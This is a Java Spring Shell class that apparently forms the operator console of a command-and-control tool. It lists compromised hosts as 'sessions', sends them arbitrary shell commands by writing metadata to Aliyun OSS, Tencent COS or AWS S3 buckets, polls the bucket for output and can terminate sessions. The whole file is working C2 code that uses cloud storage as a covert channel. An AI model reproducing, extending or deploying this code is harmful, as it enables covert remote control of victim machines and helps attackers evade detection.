package server;

import com.aliyun.oss.OSSClient;
import com.aliyun.oss.model.OSSObject;
import com.amazonaws.services.s3.AmazonS3Client;
import com.amazonaws.services.s3.model.S3Object;
import com.qcloud.cos.COSClient;
import com.qcloud.cos.model.COSObject;
import org.springframework.core.annotation.Order;
import org.springframework.shell.standard.ShellComponent;
import org.springframework.shell.standard.ShellMethod;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.LinkedList;

@ShellComponent
@Order(2)
public class LucianCommands
        extends Commands {

    @ShellMethod(value = "【需要执行的sessionid和命令】Interact with the supplied session ID, And exec CMD\\BASH", key = {"session -i", "s -i"})
    public String sessionI(int sid, String cmd) {

        if (!commandstate || OSSClient == null) {
            return "【请先正确配置对象存储】please use config command first";
        }

        String key = (String) sessionsList.get(sid - 1).get(0);

        if (OSSClient instanceof OSSClient) {
            return OSSExec((OSSClient) OSSClient, sid, key, cmd);
        } else if (OSSClient instanceof COSClient) {
            return COSExec((COSClient) OSSClient, sid, key, cmd);
        } else if (OSSClient instanceof AmazonS3Client) {
            return S3Exec((AmazonS3Client) OSSClient, sid, key, cmd);
        }

        return "no result";

    }

    @ShellMethod(value = "【显示全部的主机信息】List all active sessions and metainfo", key = "sessions")
    public String sessions() {
        if (!commandstate || OSSClient == null) {
            return "【请先正确配置对象存储】please use config command first";
        }

        if ("COS".equals(getType())) {
            return sessionsTitle + new BucketCommands().listOSSSessions((COSClient) getOSSClient());
        } else if ("OSS".equals(getType())) {
            return sessionsTitle + new BucketCommands().listOSSSessions((OSSClient) getOSSClient());
        } else if ("S3".equals(getType())) {
            return sessionsTitle + new BucketCommands().listS3Sessions((AmazonS3Client) getOSSClient());
        }
        return "";
    }

    @ShellMethod(value = "【强制下线主机】Terminate sessions by session ID and/or range", key = "session -k")
    public void sessionK(int pid) {
        LinkedList session = getSessionsList().get(pid - 1);

        if ("OSS".equals(getType())) {
            ((OSSClient) getOSSClient()).deleteObject(bucketname, "" + session.get(0));

        } else if ("COS".equals(getType())) {

            ((COSClient) getOSSClient()).deleteObject(bucketname, "" + session.get(0));

        } else if ("S3".equals(getType())) {
            ((AmazonS3Client) getOSSClient()).deleteObject(bucketname, "" + session.get(0));

        }

    }

    private String OSSExec(OSSClient ossClient, int sid, String key, String cmd) {
        com.aliyun.oss.model.CopyObjectRequest request =
                new com.aliyun.oss.model.CopyObjectRequest(bucketname, key, bucketname, key);

        String metainfo = (String) sessionsList.get(sid - 1).get(1);

        com.aliyun.oss.model.ObjectMetadata meta = new com.aliyun.oss.model.ObjectMetadata();
        meta.addUserMetadata("cmd", cmd);
        meta.addUserMetadata("info", metainfo);
        request.setNewObjectMetadata(meta);
        ossClient.copyObject(request);

        int trySum = 0;
        while (trySum < 40) {
            trySum++;
            try {
                Thread.sleep(1000);
                String res = readOSSRes(key, ossClient);
                if (res.contains("|") && res.contains("|" + cmd + "|")) {
                    return res;
                }

            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
        return "no result";
    }

    private String readOSSRes(String key, OSSClient ossClient) {
        StringBuffer sb = new StringBuffer("");

        OSSObject ossObject = ossClient.getObject(bucketname, key);

        BufferedReader reader = new BufferedReader(new InputStreamReader(ossObject.getObjectContent()));
        try {
            while (true) {
                String line = reader.readLine();
                if (line == null) {
                    break;
                }
                sb.append(("\n" + line));
            }
        } catch (IOException e) {
            e.printStackTrace();
        } finally {
            try {
                reader.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
        return sb.toString();
    }

    private String COSExec(COSClient cosClient, int sid, String key, String cmd) {
        com.qcloud.cos.model.CopyObjectRequest request =
                new com.qcloud.cos.model.CopyObjectRequest(bucketname, key, bucketname, key);

        String metainfo = (String) sessionsList.get(sid - 1).get(1);

        com.qcloud.cos.model.ObjectMetadata meta = new com.qcloud.cos.model.ObjectMetadata();
        meta.addUserMetadata("cmd", cmd);
        meta.addUserMetadata("info", metainfo);
        request.setNewObjectMetadata(meta);
        cosClient.copyObject(request);

        int trySum = 0;
        while (trySum < 40) {
            trySum++;
            try {
                Thread.sleep(1000);
                String res = readCOSRes(key, cosClient);
                if (res.contains("|") && res.contains("|" + cmd + "|")) {
                    return res;
                }
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
        return "no result";
    }

    private String readCOSRes(String key, COSClient cosClient) {
        StringBuffer sb = new StringBuffer("");

        COSObject cosObject = cosClient.getObject(bucketname, key);

        BufferedReader reader = new BufferedReader(new InputStreamReader(cosObject.getObjectContent()));
        try {
            while (true) {
                String line = reader.readLine();
                if (line == null) {
                    break;
                }
                sb.append(("\n" + line));
            }
        } catch (IOException e) {
            e.printStackTrace();
        } finally {
            try {
                reader.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
        return sb.toString();
    }

    private String S3Exec(AmazonS3Client s3Client, int sid, String key, String cmd) {
        com.amazonaws.services.s3.model.CopyObjectRequest request =
                new com.amazonaws.services.s3.model.CopyObjectRequest(bucketname, key, bucketname, key);

        String metainfo = (String) sessionsList.get(sid - 1).get(1);

        com.amazonaws.services.s3.model.ObjectMetadata meta = new com.amazonaws.services.s3.model.ObjectMetadata();
        meta.addUserMetadata("cmd", cmd);
        meta.addUserMetadata("info", metainfo);
        request.setNewObjectMetadata(meta);
        s3Client.copyObject(request);

        int trySum = 0;
        while (trySum < 40) {
            trySum++;
            try {
                Thread.sleep(1000);
                String res = readS3Res(key, s3Client);
                if (res.contains("|") && res.contains("|" + cmd + "|")) {
                    return res;
                }
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
        return "no result";
    }

    private String readS3Res(String key, AmazonS3Client s3Client) {
        StringBuffer sb = new StringBuffer("");

        S3Object s3Object = s3Client.getObject(bucketname, key);

        BufferedReader reader = new BufferedReader(new InputStreamReader(s3Object.getObjectContent()));
        try {
            while (true) {
                String line = reader.readLine();
                if (line == null) {
                    break;
                }
                sb.append(("\n" + line));
            }
        } catch (IOException e) {
            e.printStackTrace();
        } finally {
            try {
                reader.close();
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
        return sb.toString();
    }

}
